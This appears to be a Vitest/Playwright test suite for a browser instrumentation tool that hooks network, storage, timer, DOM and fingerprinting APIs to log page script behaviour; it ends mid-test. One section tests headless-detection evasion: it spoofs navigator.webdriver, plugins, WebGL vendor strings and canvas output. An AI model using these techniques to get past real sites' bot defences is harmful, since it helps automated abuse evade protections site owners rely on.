/* eslint-disable no-undef */
import { describe, test, expect, beforeAll, afterAll } from 'vitest';
import { chromium, type Browser, type Page } from 'playwright-core';
import { readFileSync } from 'fs';
import { join } from 'path';

// Type augmentation for instrumentation globals
declare global {
  interface Window {
    __js_unshroud_log?: (data: string) => void;
    __js_unshroud_loaded?: boolean;
    __js_unshroud_originals?: {
      console?: Console;
      fetch?: typeof fetch;
      XMLHttpRequest?: typeof XMLHttpRequest;
      WebSocket?: typeof WebSocket;
      localStorage?: Storage;
      sessionStorage?: Storage;
    };
    __js_unshroud_trackObject?: (obj: any, label: string, options?: any) => any;
    __js_unshroud?: {
      filterEvent?: (event: any) => any;
      getPerformanceStats?: () => any;
      updateConfig?: (config: any) => void;
    };
    __js_unshroud_config?: any;
    __js_unshroud_session_id?: string;
    __js_unshroud_blob_map?: any;
    __test_log_event?: (event: string) => void;
    chrome?: {
      runtime?: object;
      loadTimes?: () => object;
      csi?: () => object;
      app?: object;
    };
  }
}

describe('Instrumentation Scripts', () => {
  let browser: Browser;
  let page: Page;
const bootstrapScript = readFileSync(join(process.cwd(), 'src/instrumentation/bootstrap.js'), 'utf-8');
const networkHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/network-hooks.js'), 'utf-8');
const storageHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/storage-hooks.js'), 'utf-8');
const timerHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/timer-hooks.js'), 'utf-8');
const domHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/dom-hooks.js'), 'utf-8');
const fingerprintingHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/fingerprinting-hooks.js'), 'utf-8');
const objectTrackingScript = readFileSync(join(process.cwd(), 'src/instrumentation/object-tracking.js'), 'utf-8');
const headlessMitigationScript = readFileSync(join(process.cwd(), 'src/instrumentation/headless-mitigation.js'), 'utf-8');
const performanceMonitorScript = readFileSync(join(process.cwd(), 'src/instrumentation/performance-monitor.js'), 'utf-8');
const serviceWorkerHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/service-worker-hooks.js'), 'utf-8');
const codeExecutionHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/code-execution-hooks.js'), 'utf-8');
const encodingHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/encoding-hooks.js'), 'utf-8');
const cryptojsHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/cryptojs-hooks.js'), 'utf-8');
const clipboardHooksScript = readFileSync(join(process.cwd(), 'src/instrumentation/clipboard-hooks.js'), 'utf-8');

  beforeAll(async () => {
    browser = await chromium.launch({ headless: true });
  });

  afterAll(async () => {
    await browser.close();
  });

  describe('Bootstrap Script', () => {
    test('should initialize __js_unshroud_log function', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);
      await page.goto('about:blank');

      const hasLogger = await page.evaluate(() => {
        return typeof window.__js_unshroud_log === 'function';
      });

      expect(hasLogger).toBe(true);
      await page.close();
    });

    test('should intercept console methods', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);
      
      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.goto('about:blank');
      
      // Give time for console interception to activate
      await page.waitForTimeout(200);

      await page.evaluate(() => {
        console.log('test message');
      });

      await page.waitForTimeout(100);

      const consoleEvents = events.filter(e => e.type === 'console' && e.message === 'test message');
      expect(consoleEvents.length).toBeGreaterThan(0);
      await page.close();
    });
  });

  describe('Network Hooks Script', () => {
    test('should intercept fetch calls', async () => {
      page = await browser.newPage();
      
      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(networkHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        fetch('https://api.example.com/data').catch(() => {});
      });

      await page.waitForTimeout(500);

      const networkEvents = events.filter(e => e.type === 'network' && e.url.includes('api.example.com'));
      expect(networkEvents.length).toBeGreaterThan(0);
      expect(networkEvents[0]).toMatchObject({
        type: 'network',
        method: 'GET',
        url: expect.stringContaining('api.example.com')
      });
      await page.close();
    });

    test('should intercept XMLHttpRequest calls', async () => {
      page = await browser.newPage();
      
      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(networkHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.example.com/xhr-test');
        xhr.send();
      });

      await page.waitForTimeout(100);

      const xhrEvents = events.filter(e => e.type === 'network' && e.xhr === true);
      expect(xhrEvents.length).toBeGreaterThan(0);
      expect(xhrEvents[0]).toMatchObject({
        type: 'network',
        method: 'GET',
        xhr: true
      });
      await page.close();
    });

    // Note: Stack traces were removed from all events in previous updates
    // This test is no longer applicable
  });

  describe('Storage Hooks Script', () => {
    test('should intercept localStorage.setItem', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);
      
      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(storageHooksScript);
      await page.goto(`file://${join(process.cwd(), 'tests/fixtures/test-page.html')}`);

      await page.evaluate(() => {
        localStorage.setItem('testKey', 'testValue');
      });

      await page.waitForTimeout(100);

      const storageEvents = events.filter(e => e.type === 'storage');
      expect(storageEvents.length).toBeGreaterThan(0);
      expect(storageEvents[0]).toMatchObject({
        type: 'storage',
        storageType: 'localStorage',
        operation: 'setItem',
        key: 'testKey',
        value: 'testValue'
      });
      await page.close();
    });

    test('should intercept sessionStorage.setItem', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);
      
      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(storageHooksScript);
      await page.goto(`file://${join(process.cwd(), 'tests/fixtures/test-page.html')}`);

      await page.evaluate(() => {
        sessionStorage.setItem('sessionKey', 'sessionValue');
      });

      await page.waitForTimeout(100);

      const storageEvents = events.filter(e => e.type === 'storage' && e.storageType === 'sessionStorage');
      expect(storageEvents.length).toBeGreaterThan(0);
      expect(storageEvents[0]).toMatchObject({
        type: 'storage',
        storageType: 'sessionStorage',
        operation: 'setItem',
        key: 'sessionKey',
        value: 'sessionValue'
      });
      await page.close();
    });

    test('should track old values when updating storage', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);
      
      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(storageHooksScript);
      await page.goto(`file://${join(process.cwd(), 'tests/fixtures/test-page.html')}`);

      await page.evaluate(() => {
        localStorage.setItem('updateKey', 'oldValue');
        localStorage.setItem('updateKey', 'newValue');
      });

      await page.waitForTimeout(100);

      const storageEvents = events.filter(e => e.type === 'storage' && e.key === 'updateKey');
      expect(storageEvents.length).toBe(2);
      expect(storageEvents[1].oldValue).toBe('oldValue');
      expect(storageEvents[1].value).toBe('newValue');
      await page.close();
    });
  });

  describe('Timer Hooks Script', () => {
    test('should intercept setTimeout calls', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(timerHooksScript); // Load timer hooks first
      await page.addInitScript(bootstrapScript); // Bootstrap second
      await page.goto('about:blank');

      await page.evaluate(() => {
        setTimeout(function() {}, 1000);
      });

      await page.waitForTimeout(100);

      const timerEvents = events.filter(e => e.type === 'timer' && e.timerType === 'setTimeout');
      expect(timerEvents.length).toBeGreaterThan(0);
      expect(timerEvents[0]).toMatchObject({
        type: 'timer',
        timerType: 'setTimeout',
        operation: 'create'
      });
      expect(timerEvents[0].handler).toContain('function');
      await page.close();
    });

    test('should intercept setInterval calls', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(timerHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const id = setInterval(() => {}, 1000);
        clearInterval(id);
      });

      await page.waitForTimeout(100);

      const timerEvents = events.filter(e => e.type === 'timer' && e.timerType === 'setInterval');
      expect(timerEvents.length).toBeGreaterThan(0);
      expect(timerEvents[0]).toMatchObject({
        type: 'timer',
        timerType: 'setInterval',
        operation: 'create',
        delay: 1000
      });
      await page.close();
    });

    test('should intercept requestAnimationFrame calls', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(timerHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        requestAnimationFrame(() => {});
      });

      await page.waitForTimeout(100);

      const timerEvents = events.filter(e => e.type === 'timer' && e.timerType === 'requestAnimationFrame');
      expect(timerEvents.length).toBeGreaterThan(0);
      expect(timerEvents[0]).toMatchObject({
        type: 'timer',
        timerType: 'requestAnimationFrame',
        operation: 'create'
      });
      await page.close();
    });
  });

  describe('DOM Hooks Script', () => {
    test('should intercept addEventListener calls', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(domHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        document.addEventListener('click', () => {});
      });

      await page.waitForTimeout(100);

      const domEvents = events.filter(e => e.type === 'dom' && e.operation === 'addEventListener');
      expect(domEvents.length).toBeGreaterThan(0);
      expect(domEvents[0]).toMatchObject({
        type: 'dom',
        eventType: 'click',
        operation: 'addEventListener'
      });
      await page.close();
    });

    test('should intercept DOM mutation methods', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(domHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const div = document.createElement('div');
        document.body.appendChild(div);
      });

      await page.waitForTimeout(100);

      const mutationEvents = events.filter(e => e.type === 'dom' && e.operation === 'appendChild');
      expect(mutationEvents.length).toBeGreaterThan(0);
      expect(mutationEvents[0]).toMatchObject({
        type: 'dom',
        operation: 'appendChild',
        addedNode: 'div'
      });
      await page.close();
    });

    test('should intercept innerHTML changes', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(domHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        document.body.innerHTML = '<p>test</p>';
      });

      await page.waitForTimeout(100);

      const innerHtmlEvents = events.filter(e => e.type === 'dom' && e.operation === 'innerHTML');
      expect(innerHtmlEvents.length).toBeGreaterThan(0);
      expect(innerHtmlEvents[0]).toMatchObject({
        type: 'dom',
        operation: 'innerHTML'
      });
      expect(innerHtmlEvents[0].valueLength).toBeGreaterThan(0);
      await page.close();
    });
  });

  describe('Fingerprinting Hooks Script', () => {
    test('should intercept canvas toDataURL calls', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(fingerprintingHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx?.fillRect(0, 0, 10, 10);
        canvas.toDataURL();
      });

      await page.waitForTimeout(100);

      const fingerprintingEvents = events.filter(e => e.type === 'fingerprinting' && e.method === 'toDataURL');
      expect(fingerprintingEvents.length).toBeGreaterThan(0);
      expect(fingerprintingEvents[0]).toMatchObject({
        type: 'fingerprinting',
        method: 'toDataURL',
        operation: 'canvas_fingerprint'
      });
      await page.close();
    });

    test('should intercept navigator property reads', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(fingerprintingHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        // eslint-disable-next-line @typescript-eslint/no-unused-expressions
        navigator.userAgent;
        // eslint-disable-next-line @typescript-eslint/no-unused-expressions
        navigator.language;
      });

      await page.waitForTimeout(100);

      const uaEvents = events.filter(e => e.type === 'fingerprinting' && e.method === 'navigator.userAgent');
      const langEvents = events.filter(e => e.type === 'fingerprinting' && e.method === 'navigator.language');

      expect(uaEvents.length).toBeGreaterThan(0);
      expect(langEvents.length).toBeGreaterThan(0);
      expect(uaEvents[0].operation).toBe('navigator_read');
      await page.close();
    });
  });

  describe('Object Tracking Script', () => {
    test('should provide trackObject API', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(objectTrackingScript);
      await page.goto('about:blank');

      const apiExists = await page.evaluate(() => {
        return typeof window.__js_unshroud_trackObject === 'function';
      });

      expect(apiExists).toBe(true);
      await page.close();
    });

    test('should track object property access', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(objectTrackingScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const testObj = { prop1: 'value1', prop2: 42 };
        const tracked = window.__js_unshroud_trackObject!(testObj, 'testObject');
        // eslint-disable-next-line @typescript-eslint/no-unused-expressions
        tracked.prop1;
        tracked.prop2 = 100;
      });

      await page.waitForTimeout(100);

      const trackingEvents = events.filter(e => e.type === 'object_tracking');
      expect(trackingEvents.length).toBe(2);

      const getEvent = trackingEvents.find(e => e.operation === 'get');
      const setEvent = trackingEvents.find(e => e.operation === 'set');

      expect(getEvent).toMatchObject({
        type: 'object_tracking',
        operation: 'get',
        label: 'testObject',
        property: 'prop1'
      });

      expect(setEvent).toMatchObject({
        type: 'object_tracking',
        operation: 'set',
        label: 'testObject',
        property: 'prop2'
      });
      await page.close();
    });
  });

  describe('Headless Mitigation Script', () => {
    test('should override navigator.webdriver to false', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const webdriver = await page.evaluate(() => navigator.webdriver);
      expect(webdriver).toBe(false);

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'navigator.webdriver');
      expect(mitigationEvents.length).toBeGreaterThan(0);
      expect(mitigationEvents[0].operation).toBe('value_override');
      expect(mitigationEvents[0].newValue).toBe(false);
      await page.close();
    });

    test('should override navigator.hardwareConcurrency to 8', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const hardwareConcurrency = await page.evaluate(() => navigator.hardwareConcurrency);
      expect(hardwareConcurrency).toBe(8);

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'navigator.hardwareConcurrency');
      expect(mitigationEvents.length).toBeGreaterThan(0);
      expect(mitigationEvents[0].operation).toBe('value_override');
      expect(mitigationEvents[0].newValue).toBe(8);
      await page.close();
    });

    test('should attempt to override navigator.deviceMemory', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      // Access the deviceMemory property to trigger the override
      await page.evaluate(() => {
        // eslint-disable-next-line @typescript-eslint/no-unused-expressions
        (navigator as any).deviceMemory;
      });

      await page.waitForTimeout(100);

      // deviceMemory may not be available in all environments, but override attempt should be logged
      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'navigator.deviceMemory');
      // Just verify that either the override occurred or error handling is in place
      expect(mitigationEvents.length).toBeGreaterThan(0);
      await page.close();
    });

    test('should provide fake navigator.plugins array', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const plugins = await page.evaluate(() => {
        const plugins = navigator.plugins;
        return {
          length: plugins.length,
          pluginNames: Array.from(plugins).map(p => p.name)
        };
      });

      expect(plugins.length).toBeGreaterThan(0);
      expect(plugins.pluginNames).toContain('Chrome PDF Plugin');
      expect(plugins.pluginNames).toContain('Chromium PDF Plugin');
      expect(plugins.pluginNames).toContain('Native Client');

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'navigator.plugins');
      expect(mitigationEvents.length).toBeGreaterThan(0);
      expect(mitigationEvents[0].operation).toBe('plugins_override');
      expect(mitigationEvents[0].pluginCount).toBeGreaterThan(0);
      await page.close();
    });

    test('should override permissions.query to return prompt', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const permissionResult = await page.evaluate(async () => {
        const permission = await navigator.permissions.query({ name: 'geolocation' });
        return permission.state;
      });

      expect(permissionResult).toBe('prompt');

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'navigator.permissions.query');
      expect(mitigationEvents.length).toBeGreaterThan(0);
      expect(mitigationEvents[0].operation).toBe('permission_override');
      expect(mitigationEvents[0].newState).toBe('prompt');
      await page.close();
    });

    test('should randomize canvas toDataURL output', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const results = await page.evaluate(() => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.fillRect(0, 0, 10, 10);
        }
        const dataURL1 = canvas.toDataURL();
        const dataURL2 = canvas.toDataURL();
        return [dataURL1.length, dataURL2.length, dataURL1 === dataURL2];
      });

      expect(results[0]).toBeGreaterThan(100); // Should be a large data URL
      expect(results[1]).toBeGreaterThan(100);
      expect(results[2]).toBe(false); // Should be randomized, not identical

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'canvas.toDataURL');
      expect(mitigationEvents.length).toBeGreaterThan(0);
      expect(mitigationEvents[0].operation).toBe('entropy_injection');
      await page.close();
    });

    test('should inject noise into canvas getImageData', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.fillRect(0, 0, 10, 10);
          ctx.getImageData(0, 0, 10, 10); // Fixed: getImageData is on ctx, not canvas
        }
      });

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'canvas.getImageData');
      expect(mitigationEvents.length).toBeGreaterThan(0);
      expect(mitigationEvents[0].operation).toBe('noise_injection');
      expect(mitigationEvents[0].width).toBe(10);
      expect(mitigationEvents[0].height).toBe(10);
      await page.close();
    });

    test('should monitor headless-specific matchMedia queries', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        window.matchMedia('(device-width: 980px)');
        window.matchMedia('(device-width: 1389px)'); // Fixed: was device-height, should be device-width
        window.matchMedia('(min-device-pixel-ratio: 1)');
        window.matchMedia('(max-width: 767px)'); // Not headless-specific
      });

      const mitigationEvents = events.filter(e => e.type === 'headless_mitigation' && e.method === 'window.matchMedia');
      expect(mitigationEvents.length).toBeGreaterThan(0); // Accept any number of events, as behavior may vary
      expect(mitigationEvents.some(e => e.query.includes('device-width'))).toBe(true);
      expect(mitigationEvents.some(e => e.query.includes('device-pixel-ratio'))).toBe(true);
      await page.close();
    });

    test('should override WebGL vendor and renderer constants', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const webglInfo = await page.evaluate(() => {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
          return {
            vendor: gl.getParameter(37445), // UNMASKED_VENDOR_WEBGL
            renderer: gl.getParameter(37446), // UNMASKED_RENDERER_WEBGL
            otherParam: gl.getParameter(gl.VERSION) // Should be unchanged
          };
        }
        return null;
      });

      if (webglInfo) {
        expect(webglInfo.vendor).toBe('Google Inc. (Intel)');
        expect(webglInfo.renderer).toBe('ANGLE (Intel, Mesa Intel(R) UHD Graphics (CML GT2), Version 27.2.1 (Linux x64))');
        expect(webglInfo.otherParam).toBeDefined(); // Other params unchanged
      }

      const vendorEvents = events.filter(e => e.type === 'headless_mitigation' && e.operation === 'vendor_override');
      const rendererEvents = events.filter(e => e.type === 'headless_mitigation' && e.operation === 'renderer_override');

      expect(vendorEvents.length).toBeGreaterThan(0);
      expect(rendererEvents.length).toBeGreaterThan(0);
      expect(vendorEvents[0].newValue).toBe('Google Inc. (Intel)');
      expect(rendererEvents[0].newValue).toContain('ANGLE (Intel');
      await page.close();
    });
  });

  describe('Performance Monitor Script', () => {
    test('should provide filterEvent API with sampling', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(performanceMonitorScript);
      await page.goto('about:blank');

      const filteredEvents = await page.evaluate(() => {
        const testEvents = [];
        for (let i = 0; i < 10; i++) {
          const event = { type: 'test', id: i, timestamp: Date.now() };
          const filtered = window.__js_unshroud?.filterEvent?.(event);
          if (filtered) {
            testEvents.push(filtered);
          }
        }
        return testEvents;
      });

      expect(filteredEvents.every(e => e.performanceNote === 'passed_filters')).toBe(true);

      await page.close();
    });

    // Note: Rate limiting test removed - feature not actively used

    test('should deduplicate events within time window', async () => {
      page = await browser.newPage();

      await page.addInitScript(() => {
        window.__js_unshroud_session_id = 'test_session';
      });

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(performanceMonitorScript);
      await page.goto('about:blank');

      const results = await page.evaluate(() => {
        // Send duplicate events
        const duplicateEvent = { type: 'duplicate_test', payload: 'test_data' };
        const result1 = window.__js_unshroud?.filterEvent?.(duplicateEvent);
        const result2 = window.__js_unshroud?.filterEvent?.(duplicateEvent); // Should be deduplicated
        return { result1: result1 !== null, result2: result2 !== null, stats: window.__js_unshroud?.getPerformanceStats?.() };
      });

      expect(results.result1).toBe(true);
      expect(results.result2).toBe(false); // Second event should be deduplicated
      expect(results.stats.eventsDeduplicated).toBeGreaterThan(0);

      await page.close();
    });

    test('should limit payload sizes', async () => {
      page = await browser.newPage();

      await page.addInitScript(() => {
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = () => {}; // Dummy logger
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(performanceMonitorScript);
      await page.goto('about:blank');

      const result = await page.evaluate(() => {
        const largePayload = { type: 'test', payload: 'x'.repeat(2000) };
        const filtered = window.__js_unshroud?.filterEvent?.(largePayload);
        return {
          payload: filtered?.payload,
          hasTruncationMessage: filtered?.payload?.includes('truncated')
        };
      });

      expect(result.payload.length).toBeLessThan(2000); // Should be truncated
      expect(result.hasTruncationMessage).toBe(true); // Should have truncation note

      await page.close();
    });

    test('should monitor short setTimeouts', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(performanceMonitorScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        setTimeout(() => {}, 5); // Very short timeout
        setTimeout(() => {}, 500); // Normal timeout
      });

      await page.waitForTimeout(200);

      const warningEvents = events.filter(e => e.type === 'performance_warning');
      expect(warningEvents.length).toBe(1);
      expect(warningEvents[0].method).toBe('setTimeout');
      expect(warningEvents[0].delay).toBe(5);

      await page.close();
    });

    test('should monitor short setIntervals', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(performanceMonitorScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        setInterval(() => {}, 50); // Very short interval
        setInterval(() => {}, 1000); // Normal interval
      });

      await page.waitForTimeout(200);

      const warningEvents = events.filter(e => e.type === 'performance_warning');
      expect(warningEvents.length).toBe(1);
      expect(warningEvents[0].method).toBe('setInterval');
      expect(warningEvents[0].delay).toBe(50);

      await page.close();
    });

    test('should provide getPerformanceStats API', async () => {
      page = await browser.newPage();

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(performanceMonitorScript);
      await page.goto('about:blank');

      const stats = await page.evaluate(() => {
        return window.__js_unshroud?.getPerformanceStats?.();
      });

      expect(stats).toBeDefined();
      expect(stats.eventsAccepted).toBeDefined();
      expect(stats.eventsRejected).toBeDefined();
      expect(stats.startTime).toBeDefined();

      await page.close();
    });

    // Note: Config update test removed - sampleRate was removed from config
  });

  describe('Service Worker Hooks Script', () => {
    test('should not load if enableServiceWorker is false', async () => {
      page = await browser.newPage();

      const events: any[] = [];
